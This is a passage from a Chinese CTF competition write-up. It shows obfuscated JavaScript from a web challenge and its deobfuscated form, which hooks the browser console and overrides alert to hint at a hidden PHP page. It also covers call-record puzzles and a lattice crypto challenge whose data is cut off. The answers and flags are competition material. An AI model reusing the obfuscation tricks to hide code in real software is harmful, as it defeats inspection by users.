_0x2748d4=_0x49bbd1,_0x4a5a98=_0x3b189a?function(){var _0x3de893={_0x3f0d48:0x1b7,_0x40ca85:0x1de,_0x44cc63:0x3e8},_0x10455e={_0x3083d1:0x90,_0x632be9:0x1b6};function _0xbb3584(_0x135760,_0x1cecff,_0x1b373f,_0x2eb568){return _0x472cde(_0x2eb568,_0x1cecff-0x1a8,_0x135760-_0x10455e._0x3083d1,_0x2eb568-_0x10455e._0x632be9);}function _0x42ddc5(_0x2531ca,_0x3f3c80,_0x35d7ae,_0x118508){return _0x4145d7(_0x2531ca-_0x3de893._0x3f0d48,_0x3f3c80-_0x3de893._0x40ca85,_0x118508,_0x35d7ae-_0x3de893._0x44cc63);}if(_0x2748d4['XbQPZ'](_0x2748d4['rdzih'],_0x2748d4[_0xbb3584(-_0x11031c._0x14b596,-_0x11031c._0x170af6,_0x11031c._0x3a5b25,-_0x11031c._0x46e1f8)])){var _0x137536=_0x5b716f[_0xbb3584(-0x34,-_0x11031c._0x117854,-0x32,-_0x11031c._0x53a9fb)](_0x1130dd,arguments);return _0x16d37e=null,_0x137536;}else{if(_0x24bac0){if(_0x2748d4[_0xbb3584(-0x2c,-_0x11031c._0x5455dc,-_0x11031c._0x2b5959,-_0x11031c._0x34c283)](_0x2748d4[_0x42ddc5(_0x11031c._0x1d9e57,_0x11031c._0xb9a172,_0x11031c._0xe479af,0x4ef)],_0x2748d4['iiEnj'])){if(_0x2bd5a3){var _0x233e4b=_0x31bac3[_0xbb3584(-0x34,-_0x11031c._0x4adc73,-_0x11031c._0x426376,-_0x11031c._0x5ddded)](_0x20c483,arguments);return _0x2f7999=null,_0x233e4b;}}else{var _0x27b3a6=_0x24bac0['apply'](_0x4c04a2,arguments);return _0x24bac0=null,_0x27b3a6;}}}}:function(){};return _0x3b189a=![],_0x4a5a98;};}());function _0x43b95d(_0x16a9da,_0x24077d,_0x3b1e2f,_0x31bd32){var _0x415853={_0x365bca:0x88};return _0x2fa2(_0x16a9da-_0x415853._0x365bca,_0x24077d);}function _0x219d(){var _0x30f34b=['BgvUz3rO','x19WCM90B19F','yMHwBLK','r0fpB2y','ndq1mdK3vKXQD2Xf','BMn0Aw9UkcKG','qKriuhy','zNnOyNmUCgHW77Ym','sNfnv2u','sNvZDcbWyxj0ia','CMv0DxjUicHMDq','Bg9N','u3zVDMK','Dg9tDhjPBMC','vgHLCMuGAxmGBq','y29UC29Szq','mtq4mduYrhfgDePg','BeXZrMi','CMr6AwG','Ce1LCLO','mtqXmJaYmJbQrxjKtvi','y29UC3rYDwn0BW','mM9nEvvdtW','t2HSvg4','yMLUza','t1PSvLu','DhjHy2u','zxHJzxb0Aw9U','ChjVDg90ExbL','yxbWBhK','CLLSzKW','qM1dzLO','C2vHCMnO','sgTmCuS','wLPXD0y','BuDvAve','B3jLihrVignVBq','wgjrufO','qNzWyvK','DgfIBgu','rNjVr1a','rxH0Bwy','zMnKt0u','Dg9NzxrOzxi','DxHZruG','C0D1wvO','rwfHEK0','mtHwzwnYDvu','v0fUDfi','mtjowMn0uw4','mtu4mfnrCuLsuq','mZu5odf6wfHwA3q','y3rVCIGICMv0Dq','sgzKDhe','u3rPDgnOigL0ia','sNzcDgS','yvjIzxm','uwn3ALG','zxjYB3i','EKjJqLm','mJa3mtuXuMLZrvzf','mNWZFdb8mxW1Fa','kcGOlISPkYKRkq','ota4oe1Jtwz3Ba','mJa3meXSzg9OuG','ywXLCNq','ntq2mtq1D2r3rhP4','AwLfBMO','rM1vuuu','zLf1DKW'];_0x219d=function(){return _0x30f34b;};return _0x219d();}var _0xfb81ef=_0x335615(this,function(){var _0x86515e={_0x286f56:0x193,_0x19da52:0x187,_0x2b457d:0x1a9,_0x128216:0x1b2,_0x4ffbab:0x1c9,_0x28ed0e:0x170,_0x291b9a:0x199,_0x4bb0db:0x19a,_0x7c06bb:0x46d,_0x27e896:0x48c,_0x45dc0:0x190,_0x1489c9:0x1ad,_0x347965:0x1a9,_0x59f0ab:0x449,_0x2c1a61:0x430,_0x9df6de:0x451,_0x4f3b7c:0x197,_0x445b79:0x184,_0x35dac4:0x196,_0x2e155b:0x463,_0x4163a0:0x440,_0x35590a:0x449,_0x5a92d9:0x48e,_0x5713dd:0x486,_0x9ce866:0x469,_0x5d2011:0x47a,_0x2fb363:0x43a,_0x49d807:0x441,_0x4773f9:0x191,_0x2f7d38:0x189,_0x32352a:0x19c,_0xa28e16:0x1a3,_0x393026:0x1be,_0x4bed42:0x1e0,_0x3138ee:0x468,_0x1efc32:0x48a,_0x1e00d8:0x46f,_0x14f997:0x49a,_0x1fabb8:0x491,_0x18ef54:0x489,_0x3642df:0x455,_0x5e5450:0x459,_0x15d374:0x45a,_0xbb9bff:0x452,_0x540c80:0x433,_0x28a91f:0x453,_0x174890:0x44f,_0x17342b:0x1b1,_0x13795f:0x18f,_0x3c7980:0x18e,_0x397a84:0x439,_0x1dacac:0x457,_0x500c6c:0x1a6,_0x2d2155:0x186,_0x26599c:0x190},_0x1e0392={_0x2a0a5c:0xac},_0x3d04ad={_0x4cc0de:0x376},_0x218a07={_0x334681:0x437,_0x3e0531:0x423,_0x265858:0x427,_0x328b53:0x42d,_0x25e2fd:0x3ff,_0x12cc97:0x405,_0x4c19ff:0x419,_0x2f93b9:0x415,_0x122edb:0x428,_0x46fbc7:0x40c,_0x58105b:0x428},_0x18d994={_0xa1a695:0x41},_0x274b97={'pMerZ':function(_0x11187d,_0x1e4667){return _0x11187d+_0x1e4667;},'zBcBS':function(_0xfc867a){return _0xfc867a();},'HkLqK':_0xfcd4c3(0x16f,_0x86515e._0x286f56,0x183,_0x86515e._0x19da52),'BDHPv':'info','hnIHA':_0xfcd4c3(0x1d1,_0x86515e._0x2b457d,_0x86515e._0x128216,_0x86515e._0x4ffbab),'aRbes':_0xfcd4c3(_0x86515e._0x28ed0e,_0x86515e._0x291b9a,0x193,_0x86515e._0x4bb0db),'ORqsS':_0x2b8afa(_0x86515e._0x7c06bb,0x462,_0x86515e._0x27e896,0x469),'lLsFb':function(_0x34a9a3,_0x4110b5){return _0x34a9a3<_0x4110b5;},'sGuYZ':'5|2|1|0|3|'+'4'},_0x23eea3=function(){var _0x28ca73={_0x5c6bb7:0x17a,_0x4e7ce5:0x298,_0x802c84:0x7d};function _0x5515cc(_0x2e8499,_0x270277,_0xa14d2e,_0x435b89){return _0xfcd4c3(_0x270277,_0x270277-0x160,_0x435b89-0x285,_0x435b89-_0x18d994._0xa1a695);}var _0x171219;function _0x51b2df(_0xedb1f2,_0x188f0f,_0x5ba311,_0x81a1a1){return _0xfcd4c3(_0x81a1a1,_0x188f0f-_0x28ca73._0x5c6bb7,_0x188f0f-_0x28ca73._0x4e7ce5,_0x81a1a1-_0x28ca73._0x802c84);}try{_0x171219=Function(_0x274b97[_0x51b2df(_0x218a07._0x334681,_0x218a07._0x3e0531,_0x218a07._0x265858,_0x218a07._0x328b53)](_0x5515cc(_0x218a07._0x25e2fd,_0x218a07._0x12cc97,_0x218a07._0x4c19ff,0x407)+_0x51b2df(0x411,_0x218a07._0x2f93b9,_0x218a07._0x122edb,_0x218a07._0x46fbc7),'{}.constru'+_0x5515cc(_0x218a07._0x58105b,0x421,0x448,0x431)+'rn\\x20this\\x22)('+'\\x20)')+');')();}catch(_0x421704){_0x171219=window;}return _0x171219;},_0x1b449f=_0x274b97[_0xfcd4c3(_0x86515e._0x45dc0,_0x86515e._0x1489c9,0x1b3,_0x86515e._0x347965)](_0x23eea3),_0xf883ee=_0x1b449f[_0x2b8afa(_0x86515e._0x59f0ab,0x44d,_0x86515e._0x2c1a61,_0x86515e._0x9df6de)]=_0x1b449f['console']||{},_0x53109c=[_0x274b97[_0xfcd4c3(_0x86515e._0x4f3b7c,_0x86515e._0x445b79,_0x86515e._0x291b9a,_0x86515e._0x35dac4)],'warn',_0x274b97[_0x2b8afa(_0x86515e._0x2e155b,_0x86515e._0x4163a0,_0x86515e._0x35590a,0x448)],_0x274b97['hnIHA'],_0x274b97[_0x2b8afa(_0x86515e._0x5a92d9,_0x86515e._0x5713dd,_0x86515e._0x9ce866,_0x86515e._0x5d2011)],_0x274b97['ORqsS'],_0x2b8afa(_0x86515e._0x2fb363,_0x86515e._0x49d807,0x447,0x45c)];function _0x2b8afa(_0x410775,_0x271235,_0xaede52,_0x7ad671){return _0x2fa2(_0x7ad671-_0x3d04ad._0x4cc0de,_0xaede52);}function _0xfcd4c3(_0x270100,_0x1435df,_0x586469,_0x24f88a){return _0x2fa2(_0x586469-_0x1e0392._0x2a0a5c,_0x270100);}for(var _0x52328e=-0x1c37+-0x2db+0x1f12;_0x274b97[_0xfcd4c3(_0x86515e._0x45dc0,_0x86515e._0x4773f9,_0x86515e._0x2f7d38,_0x86515e._0x32352a)](_0x52328e,_0x53109c[_0xfcd4c3(0x1c2,_0x86515e._0xa28e16,_0x86515e._0x393026,_0x86515e._0x4bed42)]);_0x52328e++){var _0x161f25=_0x274b97[_0x2b8afa(0x46b,_0x86515e._0x3138ee,_0x86515e._0x1efc32,_0x86515e._0x1e00d8)]['split']('|'),_0x5ed1e0=0x162d+-0x1d*0xda+0x3*0xd7;while(!![]){switch(_0x161f25[_0x5ed1e0++]){case'0':_0x2e72f3[_0x2b8afa(_0x86515e._0x14f997,_0x86515e._0x5d2011,_0x86515e._0x1fabb8,_0x86515e._0x18ef54)]=_0x335615[_0x2b8afa(0x455,_0x86515e._0x3642df,_0x86515e._0x5e5450,_0x86515e._0x15d374)](_0x335615);continue;case'1':var _0x5b572d=_0xf883ee[_0x2327c2]||_0x2e72f3;continue;case'2':var _0x2327c2=_0x53109c[_0x52328e];continue;case'3':_0x2e72f3['toString']=_0x5b572d[_0x2b8afa(_0x86515e._0xbb9bff,_0x86515e._0x540c80,_0x86515e._0x28a91f,_0x86515e._0x174890)][_0xfcd4c3(_0x86515e._0x17342b,_0x86515e._0x13795f,0x190,_0x86515e._0x3c7980)](_0x5b572d);continue;case'4':_0xf883ee[_0x2327c2]=_0x2e72f3;continue;case'5':var _0x2e72f3=_0x335615[_0x2b8afa(_0x86515e._0x397a84,_0x86515e._0x28a91f,0x43c,_0x86515e._0x1dacac)+'r'][_0xfcd4c3(0x1ad,_0x86515e._0x128216,0x194,_0x86515e._0x500c6c)][_0xfcd4c3(0x18f,_0x86515e._0x2d2155,_0x86515e._0x26599c,0x19f)](_0x335615);continue;}break;}}});_0xfb81ef(),window[_0x43b95d(0x195,0x186,0x177,0x185)]=function(){var _0x11e4ba={_0x54ce81:0x81,_0x3f05fd:0x8b,_0x3c12d8:0x66,_0x4f7709:0x24b,_0x4097be:0x261,_0x26b0f8:0x24e,_0x34a3a3:0xb7,_0x67fb88:0x9c,_0x4337fa:0xbb,_0x2d8f19:0xbe,_0x16ffa7:0x25c,_0x29c7a0:0x239,_0x4fd058:0x245,_0x1eed2e:0x251,_0x3d8cce:0x25c,_0x135008:0x27e,_0x1548b1:0x264,_0x1aa760:0x23c,_0x229bf7:0x244,_0xe6db95:0x239,_0x3aa31e:0x23b,_0x3c19c3:0x93,_0x52b346:0xba,_0x48ed1f:0x268,_0x5d4762:0x26c,_0x3c9e76:0x254,_0x2a9f09:0x276},_0x28ad78={_0x5cc3bd:0xd7,_0x17ef46:0x1a2,_0x53dab6:0x129},_0x36a7b3={_0x2f2c5a:0xe9,_0x101124:0x10b},_0x8bd32d={'BmCfZ':function(_0x571dda,_0x15b43b){return _0x571dda(_0x15b43b);},'rjCiw':'rqxvweqty，'+_0x2f5b69(_0x11e4ba._0x54ce81,0x86,_0x11e4ba._0x3f05fd,_0x11e4ba._0x3c12d8)+'of\\x20it'},_0x12c806=_0xf4e5c(_0x11e4ba._0x4f7709,_0x11e4ba._0x4097be,0x258,0x25a)+_0xf4e5c(0x261,0x252,0x282,_0x11e4ba._0x26b0f8)+'e';function _0xf4e5c(_0x5cdb5f,_0x1bf623,_0x4be90e,_0x2b1dd6){return _0x43b95d(_0x5cdb5f-_0x36a7b3._0x2f2c5a,_0x1bf623,_0x4be90e-_0x36a7b3._0x101124,_0x2b1dd6-_0x36a7b3._0x2f2c5a);}_0x8bd32d[_0x2f5b69(_0x11e4ba._0x34a3a3,_0x11e4ba._0x67fb88,_0x11e4ba._0x4337fa,_0x11e4ba._0x2d8f19)](confirm,_0x12c806);function _0x2f5b69(_0xfde3ce,_0x57f13f,_0x4cdb67,_0x13e691){return _0x43b95d(_0x57f13f- -_0x28ad78._0x5cc3bd,_0x13e691,_0x4cdb67-_0x28ad78._0x17ef46,_0x13e691-_0x28ad78._0x53dab6);}_0x8bd32d[_0xf4e5c(_0x11e4ba._0x16ffa7,_0x11e4ba._0x29c7a0,_0x11e4ba._0x4fd058,_0x11e4ba._0x1eed2e)](confirm,_0x8bd32d['rjCiw']),_0x8bd32d[_0xf4e5c(_0x11e4ba._0x3d8cce,_0x11e4ba._0x135008,_0x11e4ba._0x1548b1,_0x11e4ba._0x1aa760)](confirm,_0xf4e5c(_0x11e4ba._0x229bf7,0x23d,_0x11e4ba._0xe6db95,_0x11e4ba._0x3aa31e)+_0x2f5b69(0xcd,0xb3,_0x11e4ba._0x3c19c3,_0x11e4ba._0x52b346)+_0xf4e5c(_0x11e4ba._0x48ed1f,_0x11e4ba._0x5d4762,_0x11e4ba._0x3c9e76,_0x11e4ba._0x2a9f09));};\n```\n\njs混淆，解密一下https://obf-io.deobfuscate.io/\n\n![image-20250524173042797](../image/achieve/202411/黄河CTF/image-20250524173042797.png)\n\n```javascript\n(function (_0x5bfa63, _0x281ba4) {\n  var _0x19cd46 = _0x5bfa63();\n  while (true) {\n    try {\n      var _0x27e61b = parseInt(_0x2fa2(208, -0x17a)) / 1 * (-parseInt(_0x2fa2(226, -0x132)) / 2) + parseInt(_0x2fa2(253, -0x124)) / 3 * (parseInt(_0x2fa2(220, -0x185)) / 4) + parseInt(_0x2fa2(270, -0x101)) / 5 + -parseInt(_0x2fa2(251, -0x16a)) / 6 * (-parseInt(_0x2fa2(264, -0x17c)) / 7) + -parseInt(_0x2fa2(267, -0x146)) / 8 * (parseInt(_0x2fa2(268, -0xde)) / 9) + parseInt(_0x2fa2(254, -0x115)) / 10 * (-parseInt(_0x2fa2(255, -0x166)) / 11) + parseInt(_0x2fa2(224, -0x174)) / 12;\n      if (_0x27e61b === _0x281ba4) {\n        break;\n      } else {\n        _0x19cd46.push(_0x19cd46.shift());\n      }\n    } catch (_0x412f22) {\n      _0x19cd46.push(_0x19cd46.shift());\n    }\n  }\n})(_0x219d, 299550);\nvar _0x3587de = function () {\n  var _0x1e85cf = {\n    uxsEH: function (_0x124e68, _0x375486) {\n      return _0x124e68 !== _0x375486;\n    }\n  };\n  _0x1e85cf.bhVnY = \"EaazM\";\n  _0x1e85cf.OZlVU = function (_0xf0c5e5, _0x41f4ee) {\n    return _0xf0c5e5 === _0x41f4ee;\n  };\n  _0x1e85cf.FroGP = \"QcwjX\";\n  _0x1e85cf.mGUiQ = \"BvpaY\";\n  _0x1e85cf.OhlTn = function (_0x558755, _0x4bc882) {\n    return _0x558755 === _0x4bc882;\n  };\n  _0x1e85cf.fcdOE = \"Hfdtq\";\n  var _0x14c4a4 = true;\n  return function (_0x1c40d7, _0x5cfc78) {\n    if (_0x1e85cf.OhlTn(_0x1e85cf.fcdOE, _0x1e85cf.fcdOE)) {\n      var _0x3a58cc = _0x14c4a4 ? function () {\n        if (\"EaazM\" !== _0x1e85cf.bhVnY) {\n          if (_0x2919f7) {\n            var _0x493883 = _0xc6e29b.apply(_0x4d40d9, arguments);\n            _0x35dcd6 = null;\n            return _0x493883;\n          }\n        } else {\n          if (_0x5cfc78) {\n            if (_0x1e85cf.OZlVU(_0x1e85cf.FroGP, _0x1e85cf.mGUiQ)) {\n              var _0xfc9fa9 = _0x55e4f3.constructor.prototype.bind(_0x22afd3);\n              var _0x105f60 = _0x17d803[_0x3e5e3b];\n              var _0x1b7aa8 = _0x59608f[_0x105f60] || _0xfc9fa9;\n              _0xfc9fa9.__proto__ = _0x20b288.bind(_0xd5c9ab);\n              _0xfc9fa9.toString = _0x1b7aa8.toString.bind(_0x1b7aa8);\n              _0x38656c[_0x105f60] = _0xfc9fa9;\n            } else {\n              var _0x32d595 = _0x5cfc78.apply(_0x1c40d7, arguments);\n              _0x5cfc78 = null;\n              return _0x32d595;\n            }\n          }\n        }\n      } : function () {};\n      _0x14c4a4 = false;\n      return _0x3a58cc;\n    } else {\n      _0xddb414 = _0x3a1bf6;\n    }\n  };\n}();\nvar _0x5c1b7b = _0x3587de(this, function () {\n  return _0x5c1b7b.toString().search(\"(((.+)+)+)+$\").toString().constructor(_0x5c1b7b).search(\"(((.+)+)+)+$\");\n});\n_0x5c1b7b();\nfunction _0x2fa2(_0x4dde84, _0x478812) {\n  var _0x29462c = _0x219d();\n  _0x2fa2 = function (_0x1089fd, _0x5a8a3d) {\n    _0x1089fd = _0x1089fd - 206;\n    var _0x32bbf7 = _0x29462c[_0x1089fd];\n    if (_0x2fa2.MPcALq === undefined) {\n      var _0x27114c = function (_0x1cfff3) {\n        var _0x15567f = '';\n        var _0x3c3450 = '';\n        var _0x3727b6 = _0x15567f + _0x27114c;\n        var _0x5b35e = 0;\n        var _0x305da;\n        var _0x2e25de;\n        for (var _0x45e1da = 0; _0x2e25de = _0x1cfff3.charAt(_0x45e1da++); ~_0x2e25de && (_0x305da = _0x5b35e % 4 ? _0x305da * 64 + _0x2e25de : _0x2e25de, _0x5b35e++ % 4) ? _0x15567f += _0x3727b6.charCodeAt(_0x45e1da + 10) - 10 !== 0 ? String.fromCharCode(255 & _0x305da >> (-2 * _0x5b35e & 6)) : _0x5b35e : 0) {\n          _0x2e25de = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='.indexOf(_0x2e25de);\n        }\n        var _0x3bef59 = 0;\n        for (var _0x1b19f0 = _0x15567f.length; _0x3bef59 < _0x1b19f0; _0x3bef59++) {\n          _0x3c3450 += '%' + ('00' + _0x15567f.charCodeAt(_0x3bef59).toString(16)).slice(-2);\n        }\n        return decodeURIComponent(_0x3c3450);\n      };\n      _0x2fa2.iNUHtA = _0x27114c;\n      _0x4dde84 = arguments;\n      _0x2fa2.MPcALq = true;\n    }\n    var _0x1cf422 = _0x29462c[0];\n    var _0xf7632 = _0x1089fd + _0x1cf422;\n    var _0x5c718f = _0x4dde84[_0xf7632];\n    if (!_0x5c718f) {\n      var _0x4e8342 = function (_0x5bb17b) {\n        this.vOUKmO = _0x5bb17b;\n        this.VyUlWP = [1, 0, 0];\n        this.RgxWRj = function () {\n          return 'newState';\n        };\n        this.lwrkKC = \"\\\\w+ *\\\\(\\\\) *{\\\\w+ *\";\n        this.IbivLK = \"['|\\\"].+['|\\\"];? *}\";\n      };\n      _0x4e8342.prototype.wDfUYW = function () {\n        var _0x47b17d = new RegExp(this.lwrkKC + this.IbivLK);\n        var _0x3d3b23 = _0x47b17d.test(this.RgxWRj.toString()) ? --this.VyUlWP[1] : --this.VyUlWP[0];\n        return this.VDwzLi(_0x3d3b23);\n      };\n      _0x4e8342.prototype.VDwzLi = function (_0xa402ba) {\n        if (!Boolean(~_0xa402ba)) {\n          return _0xa402ba;\n        }\n        return this.xwZujq(this.vOUKmO);\n      };\n      _0x4e8342.prototype.xwZujq = function (_0x65f30f) {\n        var _0x23db3e = 0;\n        for (var _0x1e8117 = this.VyUlWP.length; _0x23db3e < _0x1e8117; _0x23db3e++) {\n          this.VyUlWP.push(Math.round(Math.random()));\n          _0x1e8117 = this.VyUlWP.length;\n        }\n        return _0x65f30f(this.VyUlWP[0]);\n      };\n      new _0x4e8342(_0x2fa2).wDfUYW();\n      _0x32bbf7 = _0x2fa2.iNUHtA(_0x32bbf7);\n      _0x4dde84[_0xf7632] = _0x32bbf7;\n    } else {\n      _0x32bbf7 = _0x5c718f;\n    }\n    return _0x32bbf7;\n  };\n  return _0x2fa2(_0x4dde84, _0x478812);\n}\nvar _0x335615 = function () {\n  var _0x3b189a = true;\n  return function (_0x4c04a2, _0x24bac0) {\n    var _0x4a5a98 = _0x3b189a ? function () {\n      if (_0x24bac0) {\n        var _0x27b3a6 = _0x24bac0.apply(_0x4c04a2, arguments);\n        _0x24bac0 = null;\n        return _0x27b3a6;\n      }\n    } : function () {};\n    _0x3b189a = false;\n    return _0x4a5a98;\n  };\n}();\nfunction _0x43b95d(_0x16a9da, _0x24077d, _0x3b1e2f, _0x31bd32) {\n  return _0x2fa2(_0x16a9da - 0x88, _0x24077d);\n}\nfunction _0x219d() {\n  var _0x30f34b = ['BgvUz3rO', 'x19WCM90B19F', 'yMHwBLK', 'r0fpB2y', 'ndq1mdK3vKXQD2Xf', 'BMn0Aw9UkcKG', 'qKriuhy', 'zNnOyNmUCgHW77Ym', 'sNfnv2u', 'sNvZDcbWyxj0ia', 'CMv0DxjUicHMDq', 'Bg9N', 'u3zVDMK', 'Dg9tDhjPBMC', 'vgHLCMuGAxmGBq', 'y29UC29Szq', 'mtq4mduYrhfgDePg', 'BeXZrMi', 'CMr6AwG', 'Ce1LCLO', 'mtqXmJaYmJbQrxjKtvi', 'y29UC3rYDwn0BW', 'mM9nEvvdtW', 't2HSvg4', 'yMLUza', 't1PSvLu', 'DhjHy2u', 'zxHJzxb0Aw9U', 'ChjVDg90ExbL', 'yxbWBhK', 'CLLSzKW', 'qM1dzLO', 'C2vHCMnO', 'sgTmCuS', 'wLPXD0y', 'BuDvAve', 'B3jLihrVignVBq', 'wgjrufO', 'qNzWyvK', 'DgfIBgu', 'rNjVr1a', 'rxH0Bwy', 'zMnKt0u', 'Dg9NzxrOzxi', 'DxHZruG', 'C0D1wvO', 'rwfHEK0', 'mtHwzwnYDvu', 'v0fUDfi', 'mtjowMn0uw4', 'mtu4mfnrCuLsuq', 'mZu5odf6wfHwA3q', 'y3rVCIGICMv0Dq', 'sgzKDhe', 'u3rPDgnOigL0ia', 'sNzcDgS', 'yvjIzxm', 'uwn3ALG', 'zxjYB3i', 'EKjJqLm', 'mJa3mtuXuMLZrvzf', 'mNWZFdb8mxW1Fa', 'kcGOlISPkYKRkq', 'ota4oe1Jtwz3Ba', 'mJa3meXSzg9OuG', 'ywXLCNq', 'ntq2mtq1D2r3rhP4', 'AwLfBMO', 'rM1vuuu', 'zLf1DKW'];\n  _0x219d = function () {\n    return _0x30f34b;\n  };\n  return _0x219d();\n}\nvar _0xfb81ef = _0x335615(this, function () {\n  var _0x23eea3 = function () {\n    var _0x171219;\n    try {\n      _0x171219 = Function(\"return (function() {}.constructor(\\\"return this\\\")( ));\")();\n    } catch (_0x421704) {\n      _0x171219 = window;\n    }\n    return _0x171219;\n  };\n  var _0x1b449f = _0x23eea3();\n  var _0xf883ee = _0x1b449f.console = _0x1b449f.console || {};\n  var _0x53109c = [\"log\", 'warn', 'info', \"error\", \"exception\", \"table\", \"trace\"];\n  for (var _0x52328e = 0; _0x52328e < _0x53109c.length; _0x52328e++) {\n    var _0x2e72f3 = _0x335615.constructor.prototype.bind(_0x335615);\n    var _0x2327c2 = _0x53109c[_0x52328e];\n    var _0x5b572d = _0xf883ee[_0x2327c2] || _0x2e72f3;\n    _0x2e72f3.__proto__ = _0x335615.bind(_0x335615);\n    _0x2e72f3.toString = _0x5b572d.toString.bind(_0x5b572d);\n    _0xf883ee[_0x2327c2] = _0x2e72f3;\n  }\n});\n_0xfb81ef();\nwindow.alert = function () {\n  confirm(\"There is more to come\");\n  confirm(\"rqxvweqty，Just part of it\");\n  confirm(\"fshbs.php，Stitch it together\");\n};\n```\n\n刚好在末尾看到几句话，意思是让我们拼起来访问rqxvweqtyfshbs.php然后就能拿到flag了\n\n## PPC\n\n```\n已知 6 位嫌疑人的手机号分别是：\n135****2345\n138****7383\n153****9888\n155****7991\n157****0947\n170****5678\n```\n\n### 001\n\n瞪眼法，在40和52图片中看到大量170开头嫌疑人的通话记录，看到很多条`133****0181`通话记录，这个直接交flag就行，一开始以为是133081这么写，后面发现中间的星号也不能漏掉`flag{133****0181}`\n\n![image-20250524132229133](../image/achieve/202411/黄河CTF/image-20250524132229133.png)\n\n### 002\n\n受不了了，开个WPS会员将图片转成excel表格，然后对每个嫌疑人号码进行去重处理\n\n先是对135的嫌疑人进行了一部分排查，找到以下通讯号码\n\n`135****2345`\n\n```\n045****3555\n182****3334\n130****0330\n189****0055\n188****3456\n181****9666\n151****9299\n189****0055\n199****9108\n167****2333\n158****9994\n132****3532\n136****0321\n158****6656\n130****6097\n130****9990\n189****0606\n180****3889\n138****7815\n138****9702\n199****9156\n182****0463\n152****7979\n198****9797\n137****0400\n156****6123\n150****0563\n173****0567\n180****6511\n130****2824\n130****5504\n152****6590\n045****2227\n159****0000\n183****2288\n153****8341\n151****6777\n130****7054\n130****1974\n130****1123\n170****7222\n045****7675\n136****8234\n045****9958\n158****9775\n138****8104\n130****6254\n139****3444\n186****7748\n130****2564\n158****6074\n131****1111\n185****2442\n138****7059\n```\n\n然后刚好运气不错，对上面数据进行排查的时候刚好就查到`158****6074`号码在六个嫌疑人都有通话，试着交了结果过了，看来就一个号码同时跟六个人有过通话\n\n### 004\n\n这个题算是最简单的了，但是我却是最后才看的\n\n先将138号码的通讯记录全部调出来\n\n![image-20250524132357164](../image/achieve/202411/黄河CTF/image-20250524132357164.png)\n\n然后进行去重处理，再看看2021-12-01对应的序号是多少，从2021-12-01后开始排查最后找到四个号码\n\n```\n130****9357\n\n137****5632\n\n139****2928\n\n183****5333\n```\n\n直接交就通过了\n\n## Crypto\n\n### Lattice\n\n```python\nfrom Crypto.Util.number import *\nfrom Crypto.Cipher import AES\nimport os\nfrom secret import flag\nimport numpy as np\n\n\ndef gen(q, n, N, sigma):\n    t = np.random.randint(0, high=q // 2, size=n)\n    s = np.concatenate([np.ones(1, dtype=np.int32), t])\n    A = np.random.randint(0, high=q // 2, size=(N, n))\n    e = np.round(np.random.randn(N) * sigma**2).astype(np.int32) % q\n    b = ((np.dot(A, t) + e).reshape(-1, 1)) % q\n    P = np.hstack([b, -A])\n    return P, s\n\n\ndef enc(P, M, q):\n    N = P.shape[0]\n    n = len(M)\n    r = np.random.randint(0, 2, (n, N))\n    Z = np.zeros((n, P.shape[1]), dtype=np.int32)\n    Z[:, 0] = 1\n    C = np.zeros((n, P.shape[1]), dtype=np.int32)\n    for i in range(n):\n        C[i] = (np.dot(P.T, r[i]) + (np.floor(q / 2) * Z[i] * M[i])) % q\n    return C\n\n\nq = 127\nn = 3\nN = int(1.1 * n * np.log(q))\nsigma = 1.0\n\nP, s = gen(q, n, N, sigma)\n\n\ndef prep(s):\n    return np.array([int(b) for char in s for b in f\"{ord(char):08b}\"], dtype=np.int32)\n\n\nC = enc(P, prep(hint), q)\nP = P.tolist()\nC = C.tolist()\nprint(f\"{P=}\")\nprint(f\"{C=}\")\n\n'''\nP=[[87, -27, -52, -29], [57, -41, -24, -60], [76, -17, -55, -37], [75, -46, -33, -21], [121, -55, -33, -34], [47, -4, -34, -45], [112, -33, -44, -16], [74, -44, -5, -25], [20, -21, -16, -49], [89, -21, -54, -24], [18, -23, -53, -1], [35, -40, -4, -29], [105, -54, -2, -8], [44, -24, -43, -36], [111, -15, -15, -54]]\nC=[[24, 75, 81, 85], [24, 14, 85, 102], [115, 1, 5, 21], [58, 118, 104, 77], [65, 42, 101, 103], [33, 38, 50, 67], [7, 81, 38, 58], [117, 101, 54, 11], [44, 29, 81, 8], [59, 114, 70, 121], [62, 13, 9, 105], [11, 43, 97, 23], [39, 82, 75, 97], [122, 113, 14, 30], [70, 102, 116, 5], [58, 44, 61, 20], [73, 119, 59, 28], [119, 68, 57, 122], [61, 91, 83, 44], [103, 29, 1, 73], [47, 60, 120, 125], [17, 126, 14, 21], [104, 8, 78, 123], [72, 121, 54, 74], [48, 104, 49, 66], [72, 56, 27, 69], [34, 110, 41, 54], [33, 54, 74, 44], [70, 65, 11, 113], [122, 3, 69, 35], [58, 7, 39, 64], [59, 106, 49, 66], [77, 92, 87, 92], [95, 21, 96, 83], [67, 55, 30, 73], [99, 54, 18, 90], [101, 102, 126, 107], [81, 46, 104, 83], [38, 24, 94, 60], [114, 105, 76, 97], [22, 115, 20, 67], [40, 72, 110, 65], [111, 92, 106, 117], [5, 123, 21, 96], [41, 14, 23, 114], [113, 75, 43, 65], [56, 3, 61, 48], [40, 101, 16, 114], [42, 84, 95, 13], [36, 110, 91, 107], [4, 13, 60, 74], [24, 80, 125, 76], [123, 26, 27, 119], [31, 87, 6, 123], [61, 106, 73, 120], [66, 10, 36, 65], [91, 38, 46, 9], [121, 20, 106, 48], [123, 21, 78, 27], [22, 74, 55, 110], [47, 49, 118, 76], [30, 10, 16, 118], [43, 19, 52, 61], [100, 9, 37, 35], [20, 102, 111, 94], [116, 63, 55, 43], [13, 110, 42, 14], [46, 65, 71, 28], [82, 5, 76, 74], [86, 34, 117, 84], [28, 44, 82, 50], [76, 79, 77, 11], [68, 39, 51, 89], [83, 93, 95, 2], [54, 108, 101, 82], [99, 90, 122, 37], [16, 92, 79, 12], [67, 86, 24, 36], [80, 94, 106, 59], [50, 56, 95, 98], [33, 68, 89, 40], [74, 124, 14, 82], [88, 93, 54, 93], [51, 17, 124, 31], [17, 17, 45, 35], [113, 71, 76, 44], [48, 6, 120, 4], [36, 91, 108, 11], [2, 41, 58, 72], [42, 59, 51, 81], [73, 22, 79, 27], [85, 35, 29, 98], [76, 76, 37, 22], [82, 29, 42, 27], [75, 114, 37, 106], [40, 69, 53, 73], [39, 44, 33, 121], [94, 85, 92, 54], [91, 77, 124, 46], [108, 31, 101, 84], [35, 33, 97, 45], [99, 32, 17, 14], [1, 66, 11, 35], [78, 100, 95, 81], [73, 49, 14, 37], [70, 9, 107, 2], [84, 98, 92, 